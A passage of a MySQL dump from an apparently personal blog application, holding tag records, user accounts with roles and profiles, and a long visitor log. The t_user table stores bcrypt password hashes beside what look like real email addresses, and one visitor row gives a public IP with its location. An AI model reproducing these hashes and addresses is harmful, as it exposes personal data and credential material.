) ENGINE = InnoDB AUTO_INCREMENT = 215 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of t_tag
-- ----------------------------
INSERT INTO `t_tag` VALUES (181, 'Java', 1);
INSERT INTO `t_tag` VALUES (182, '学习路线图', 1);
INSERT INTO `t_tag` VALUES (183, '2018', 5);
INSERT INTO `t_tag` VALUES (184, 'Python', 1);
INSERT INTO `t_tag` VALUES (185, '学习线路图', 3);
INSERT INTO `t_tag` VALUES (186, '前端与移动', 1);
INSERT INTO `t_tag` VALUES (187, 'PHP', 0);
INSERT INTO `t_tag` VALUES (188, 'Go语言', 1);
INSERT INTO `t_tag` VALUES (189, '区块链', 1);
INSERT INTO `t_tag` VALUES (190, 'Lambda表达式', 1);
INSERT INTO `t_tag` VALUES (191, '接口', 1);
INSERT INTO `t_tag` VALUES (192, '函数式接口', 1);
INSERT INTO `t_tag` VALUES (193, 'JDK 8', 1);
INSERT INTO `t_tag` VALUES (194, '聚合操作', 1);
INSERT INTO `t_tag` VALUES (195, '虚拟化容器', 1);
INSERT INTO `t_tag` VALUES (196, 'Docker', 3);
INSERT INTO `t_tag` VALUES (197, '运行机制', 1);
INSERT INTO `t_tag` VALUES (198, '客户端指令', 1);
INSERT INTO `t_tag` VALUES (199, '数据管理', 1);
INSERT INTO `t_tag` VALUES (200, 'Spring Boot 2', 1);
INSERT INTO `t_tag` VALUES (201, '2022', 0);
INSERT INTO `t_tag` VALUES (202, '2023', 1);
INSERT INTO `t_tag` VALUES (203, '2030', 0);
INSERT INTO `t_tag` VALUES (204, '2050', 0);
INSERT INTO `t_tag` VALUES (205, '2066', 0);
INSERT INTO `t_tag` VALUES (206, '111', 1);
INSERT INTO `t_tag` VALUES (207, '新版', 0);
INSERT INTO `t_tag` VALUES (208, '2021', 1);
INSERT INTO `t_tag` VALUES (209, '2002', 0);
INSERT INTO `t_tag` VALUES (210, '666', 0);
INSERT INTO `t_tag` VALUES (211, 'hell', 0);
INSERT INTO `t_tag` VALUES (212, '2222', 0);
INSERT INTO `t_tag` VALUES (213, '444', 0);
INSERT INTO `t_tag` VALUES (214, '66', 0);

-- ----------------------------
-- Table structure for t_user
-- ----------------------------
DROP TABLE IF EXISTS `t_user`;
CREATE TABLE `t_user`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(200) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `password` varchar(200) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `email` varchar(200) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `created` date NULL DEFAULT NULL,
  `valid` tinyint(1) NOT NULL DEFAULT 1,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `username`(`username`) USING BTREE COMMENT '用户名唯一'
) ENGINE = InnoDB AUTO_INCREMENT = 8 CHARACTER SET = utf8 COLLATE = utf8_latvian_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of t_user
-- ----------------------------
INSERT INTO `t_user` VALUES (1, 'admin', '$2a$10$dtyRbcyzIySz7qk19LQw8ubNRgIP6g.zLtbFPozM8zEKE/S7ANSWG', '1550324080@qq.com', '2018-10-01', 1);
INSERT INTO `t_user` VALUES (2, '李四', '$2a$10$5ooQI8dir8jv0/gCa1Six.GpzAdIPf6pMqdminZ/3ijYzivCyPlfK', '1768653040@qq.com', '2018-11-13', 0);
INSERT INTO `t_user` VALUES (3, '东方不败', '$2a$10$5ooQI8dir8jv0/gCa1Six.GpzAdIPf6pMqdminZ/3ijYzivCyPlfK', '13718391550@163.com', '2018-12-18', 1);
INSERT INTO `t_user` VALUES (4, 'tom', '$2a$10$5ooQI8dir8jv0/gCa1Six.GpzAdIPf6pMqdminZ/3ijYzivCyPlfK', 'asexeees@sohu.com', '2018-12-03', 1);
INSERT INTO `t_user` VALUES (5, 'deep', '$2a$10$CHP4OE/6rLmopT.UxXjuEuVUFkiA2z1VtD2jiOkctWoCEUZHElWb6', '1550324080@qq.com', '2021-06-20', 1);
INSERT INTO `t_user` VALUES (7, '8310894', '$2a$10$wKSPz2RMPa39nSBeX0XbXe/A46psZeb3Y.sWyAHxCjm69yJMJavkW', NULL, '2021-06-20', 1);

-- ----------------------------
-- Table structure for t_user_authority
-- ----------------------------
DROP TABLE IF EXISTS `t_user_authority`;
CREATE TABLE `t_user_authority`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT '关联的用户id',
  `authority_id` int(11) NOT NULL COMMENT '关联的权限id',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 8 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of t_user_authority
-- ----------------------------
INSERT INTO `t_user_authority` VALUES (1, 1, 1);
INSERT INTO `t_user_authority` VALUES (2, 2, 2);
INSERT INTO `t_user_authority` VALUES (3, 3, 2);
INSERT INTO `t_user_authority` VALUES (4, 4, 2);
INSERT INTO `t_user_authority` VALUES (5, 5, 2);
INSERT INTO `t_user_authority` VALUES (7, 7, 1);

-- ----------------------------
-- Table structure for t_user_detail
-- ----------------------------
DROP TABLE IF EXISTS `t_user_detail`;
CREATE TABLE `t_user_detail`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '用户名',
  `blogName` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '博客名称',
  `job` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '从事工作',
  `detail` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '用户详情',
  `github` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'github',
  `weibo` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'weibo',
  `icon` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '用户头像地址',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `name`(`name`) USING BTREE,
  UNIQUE INDEX `blogName`(`blogName`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 7 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of t_user_detail
-- ----------------------------
INSERT INTO `t_user_detail` VALUES (1, 'admin', '高级开发', 'Java高级开发', '个人博客小站，主要发表关于Java、Spring、Docker、Linux等相关文章，精通各种框架源码，对多线程高并发有研究，会JVM调优', 'https://github.com/', 'https://weibo.com/?category=10011', '/user_img/641140e1b5d741a584a3b7055d6187cb.jpg');
INSERT INTO `t_user_detail` VALUES (2, '李四', '啥也不会', 'Java初级开发', '啥也不会', 'https://github.com/', 'https://weibo.com/?category=7', NULL);
INSERT INTO `t_user_detail` VALUES (3, '东方不败', '菜鸟少年', 'Java中级开发', '会一点点，只会一点点', 'https://github.com/', 'https://weibo.com/?category=12', NULL);
INSERT INTO `t_user_detail` VALUES (4, 'tom', '马化腾1', 'Java架构师', '我全都会，精通linux内核，各种框架底层源码', 'https://github.com/', 'https://weibo.com/?category=10018', '');
INSERT INTO `t_user_detail` VALUES (6, '8310894', 'yblog', '编程', '暂无详情', 'https://github.com/', 'https://weibo.com/', '/user_img/0323477285af430a9399e2bca7c616a2.jpg');

-- ----------------------------
-- Table structure for t_visitor
-- ----------------------------
DROP TABLE IF EXISTS `t_visitor`;
CREATE TABLE `t_visitor`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `visit_ip` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '访客IP',
  `visit_address` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '访客地址',
  `browser` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '访客使用的浏览器',
  `os` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '访客使用的设备系统',
  `visit_time` datetime(0) NOT NULL COMMENT '访问时间',
  `visit_describe` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '访问描述',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 554 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of t_visitor
-- ----------------------------
INSERT INTO `t_visitor` VALUES (31, '192.168.134.33', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-10 17:02:16', '访问首页');
INSERT INTO `t_visitor` VALUES (32, '120.99.55.12', '中国-广东省-广州市-天河区', 'Chrome 9', 'Windows 10', '2021-06-11 17:03:20', '访问首页');
INSERT INTO `t_visitor` VALUES (156, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-14 15:18:50', '访问首页');
INSERT INTO `t_visitor` VALUES (157, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-14 15:26:06', '访问文章');
INSERT INTO `t_visitor` VALUES (158, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-14 15:33:35', '访问文章');
INSERT INTO `t_visitor` VALUES (159, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-14 15:54:57', '访问文章');
INSERT INTO `t_visitor` VALUES (160, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-14 16:00:22', '访问文章');
INSERT INTO `t_visitor` VALUES (161, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-14 16:05:51', '访问首页');
INSERT INTO `t_visitor` VALUES (162, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-14 16:10:59', '访问首页');
INSERT INTO `t_visitor` VALUES (163, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-14 16:27:36', '访问文章');
INSERT INTO `t_visitor` VALUES (164, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-14 16:36:05', '访问文章');
INSERT INTO `t_visitor` VALUES (165, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-15 16:41:23', '访问文章');
INSERT INTO `t_visitor` VALUES (166, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-15 16:48:39', '访问文章');
INSERT INTO `t_visitor` VALUES (167, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-15 16:55:25', '访问首页');
INSERT INTO `t_visitor` VALUES (168, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-15 22:23:02', '访问首页');
INSERT INTO `t_visitor` VALUES (169, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-15 11:22:27', '访问首页');
INSERT INTO `t_visitor` VALUES (170, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-15 11:30:50', '访问首页');
INSERT INTO `t_visitor` VALUES (171, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-15 16:22:05', '访问首页');
INSERT INTO `t_visitor` VALUES (172, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-15 16:47:13', '访问首页');
INSERT INTO `t_visitor` VALUES (173, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-15 17:33:23', '访问首页');
INSERT INTO `t_visitor` VALUES (174, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-15 19:22:15', '访问首页');
INSERT INTO `t_visitor` VALUES (175, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-15 20:20:22', '访问首页');
INSERT INTO `t_visitor` VALUES (176, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-15 20:32:43', '访问首页');
INSERT INTO `t_visitor` VALUES (177, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-15 20:38:28', '访问首页');
INSERT INTO `t_visitor` VALUES (178, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-15 22:06:03', '访问首页');
INSERT INTO `t_visitor` VALUES (179, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 14:40:24', '访问首页');
INSERT INTO `t_visitor` VALUES (180, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 14:55:32', '访问首页');
INSERT INTO `t_visitor` VALUES (181, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 15:00:53', '进入后台界面');
INSERT INTO `t_visitor` VALUES (182, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 15:06:29', '进入评论列表');
INSERT INTO `t_visitor` VALUES (183, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 15:11:36', '进入黑名单管理');
INSERT INTO `t_visitor` VALUES (184, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 15:39:55', '访问首页');
INSERT INTO `t_visitor` VALUES (185, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 16:04:42', '访问首页');
INSERT INTO `t_visitor` VALUES (186, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 16:12:01', '访问首页');
INSERT INTO `t_visitor` VALUES (187, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 16:17:51', '访问首页');
INSERT INTO `t_visitor` VALUES (188, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 16:24:05', '访问首页');
INSERT INTO `t_visitor` VALUES (189, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 19:54:21', '访问文章');
INSERT INTO `t_visitor` VALUES (190, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 20:18:14', '访问首页');
INSERT INTO `t_visitor` VALUES (191, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 20:29:48', '访问文章');
INSERT INTO `t_visitor` VALUES (192, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 20:50:23', '访问文章');
INSERT INTO `t_visitor` VALUES (193, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 21:02:50', '访问首页');
INSERT INTO `t_visitor` VALUES (194, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 21:36:59', '访问文章');
INSERT INTO `t_visitor` VALUES (195, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 21:43:11', '访问文章');
INSERT INTO `t_visitor` VALUES (196, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 21:50:19', '访问文章');
INSERT INTO `t_visitor` VALUES (197, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 22:04:47', '访问文章');
INSERT INTO `t_visitor` VALUES (198, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 22:09:47', '访问首页');
INSERT INTO `t_visitor` VALUES (199, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 22:18:29', '归档页面');
INSERT INTO `t_visitor` VALUES (200, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 22:23:39', '归档页面');
INSERT INTO `t_visitor` VALUES (201, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 22:28:57', '归档页面');
INSERT INTO `t_visitor` VALUES (202, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 22:34:04', '归档页面');
INSERT INTO `t_visitor` VALUES (203, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 22:40:11', '归档页面');
INSERT INTO `t_visitor` VALUES (204, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-16 22:47:49', '归档页面');
INSERT INTO `t_visitor` VALUES (205, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-17 13:37:02', '访问文章');
INSERT INTO `t_visitor` VALUES (206, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-17 14:36:18', '访问首页');
INSERT INTO `t_visitor` VALUES (207, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-17 14:43:12', '访问首页');
INSERT INTO `t_visitor` VALUES (208, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-17 15:05:21', '访问首页');
INSERT INTO `t_visitor` VALUES (209, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-17 15:11:07', '访问首页');
INSERT INTO `t_visitor` VALUES (210, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-17 15:17:50', '访问首页');
INSERT INTO `t_visitor` VALUES (211, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-17 15:38:32', '归档页面');
INSERT INTO `t_visitor` VALUES (212, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-18 17:18:19', '访问首页');
INSERT INTO `t_visitor` VALUES (213, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-18 17:27:50', '访问首页');
INSERT INTO `t_visitor` VALUES (214, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-18 17:33:37', '访问首页');
INSERT INTO `t_visitor` VALUES (215, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-18 21:27:14', '访问首页');
INSERT INTO `t_visitor` VALUES (216, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-18 21:32:14', '访问首页');
INSERT INTO `t_visitor` VALUES (217, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-18 21:37:19', '进入系统设置界面');
INSERT INTO `t_visitor` VALUES (218, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-18 21:42:52', '访问首页');
INSERT INTO `t_visitor` VALUES (219, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-19 00:25:53', '访问首页');
INSERT INTO `t_visitor` VALUES (220, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-19 00:38:23', '访问文章');
INSERT INTO `t_visitor` VALUES (221, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-19 00:47:54', '访问文章');
INSERT INTO `t_visitor` VALUES (222, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-19 19:09:49', '访问首页');
INSERT INTO `t_visitor` VALUES (223, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-19 19:20:03', '访问首页');
INSERT INTO `t_visitor` VALUES (224, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-19 19:36:42', '访问首页');
INSERT INTO `t_visitor` VALUES (225, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-19 19:47:49', '访问首页');
INSERT INTO `t_visitor` VALUES (226, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-19 19:53:08', '访问首页');
INSERT INTO `t_visitor` VALUES (227, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-19 19:58:11', '进入后台界面');
INSERT INTO `t_visitor` VALUES (228, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-19 20:50:45', '访问首页');
INSERT INTO `t_visitor` VALUES (229, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-19 22:51:26', '访问首页');
INSERT INTO `t_visitor` VALUES (230, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-19 23:03:52', '进入统计图表页面');
INSERT INTO `t_visitor` VALUES (231, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-19 23:13:45', '访问首页');
INSERT INTO `t_visitor` VALUES (232, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-19 23:28:48', '访问首页');
INSERT INTO `t_visitor` VALUES (233, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-19 23:36:45', '访问首页');
INSERT INTO `t_visitor` VALUES (234, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-19 23:42:15', '访问首页');
INSERT INTO `t_visitor` VALUES (235, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-19 23:47:33', '访问首页');
INSERT INTO `t_visitor` VALUES (236, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 00:00:34', '访问首页');
INSERT INTO `t_visitor` VALUES (237, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 00:06:09', '访问首页');
INSERT INTO `t_visitor` VALUES (238, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 00:14:08', '访问首页');
INSERT INTO `t_visitor` VALUES (239, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 15:06:25', '访问首页');
INSERT INTO `t_visitor` VALUES (240, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 15:58:15', '访问首页');
INSERT INTO `t_visitor` VALUES (241, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 16:15:40', '访问首页');
INSERT INTO `t_visitor` VALUES (242, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 16:24:56', '访问首页');
INSERT INTO `t_visitor` VALUES (243, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 16:30:27', '访问首页');
INSERT INTO `t_visitor` VALUES (244, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 16:40:53', '访问首页');
INSERT INTO `t_visitor` VALUES (245, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 16:47:40', '访问首页');
INSERT INTO `t_visitor` VALUES (246, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 17:03:14', '访问首页');
INSERT INTO `t_visitor` VALUES (247, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 17:11:06', '访问首页');
INSERT INTO `t_visitor` VALUES (248, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 17:18:00', '访问首页');
INSERT INTO `t_visitor` VALUES (249, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 20:11:10', '访问首页');
INSERT INTO `t_visitor` VALUES (250, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 20:18:29', '访问首页');
INSERT INTO `t_visitor` VALUES (251, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 20:23:49', '访问首页');
INSERT INTO `t_visitor` VALUES (252, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 20:45:00', '访问首页');
INSERT INTO `t_visitor` VALUES (253, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 20:50:01', '进入后台界面');
INSERT INTO `t_visitor` VALUES (254, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 20:55:39', '访问首页');
INSERT INTO `t_visitor` VALUES (255, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 21:00:39', '进入后台界面');
INSERT INTO `t_visitor` VALUES (256, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 21:13:15', '访问首页');
INSERT INTO `t_visitor` VALUES (257, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 21:19:03', '访问首页');
INSERT INTO `t_visitor` VALUES (258, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 21:24:11', '访问首页');
INSERT INTO `t_visitor` VALUES (259, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 21:41:33', '访问首页');
INSERT INTO `t_visitor` VALUES (260, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 21:47:57', '访问首页');
INSERT INTO `t_visitor` VALUES (261, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 21:58:12', '访问首页');
INSERT INTO `t_visitor` VALUES (262, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 22:11:23', '访问首页');
INSERT INTO `t_visitor` VALUES (263, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 22:22:38', '访问首页');
INSERT INTO `t_visitor` VALUES (264, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 22:28:24', '访问首页');
INSERT INTO `t_visitor` VALUES (265, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 22:34:21', '访问首页');
INSERT INTO `t_visitor` VALUES (266, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 22:54:24', '访问首页');
INSERT INTO `t_visitor` VALUES (267, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 23:02:11', '访问首页');
INSERT INTO `t_visitor` VALUES (268, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 23:24:20', '访问首页');
INSERT INTO `t_visitor` VALUES (269, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-20 23:29:26', '访问首页');
INSERT INTO `t_visitor` VALUES (270, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-21 00:32:34', '访问首页');
INSERT INTO `t_visitor` VALUES (271, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-21 14:00:23', '访问首页');
INSERT INTO `t_visitor` VALUES (272, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-21 14:05:24', '访问首页');
INSERT INTO `t_visitor` VALUES (273, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-21 15:20:22', '访问首页');
INSERT INTO `t_visitor` VALUES (274, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-21 15:28:54', '访问首页');
INSERT INTO `t_visitor` VALUES (275, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-21 15:34:21', '访问首页');
INSERT INTO `t_visitor` VALUES (276, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-21 15:39:44', '访问首页');
INSERT INTO `t_visitor` VALUES (277, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-21 15:48:02', '访问首页');
INSERT INTO `t_visitor` VALUES (278, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-21 15:55:49', '访问首页');
INSERT INTO `t_visitor` VALUES (279, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-21 16:02:38', '访问首页');
INSERT INTO `t_visitor` VALUES (280, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-21 16:10:11', '访问首页');
INSERT INTO `t_visitor` VALUES (281, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-21 16:17:06', '访问首页');
INSERT INTO `t_visitor` VALUES (282, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-21 16:23:06', '访问首页');
INSERT INTO `t_visitor` VALUES (283, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-21 20:39:11', '访问首页');
INSERT INTO `t_visitor` VALUES (284, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-21 20:44:59', '访问首页');
INSERT INTO `t_visitor` VALUES (285, '192.168.184.1', '暂未检测到所在地址', 'Firefox 8', 'Windows 10', '2021-06-21 21:20:47', '访问首页');
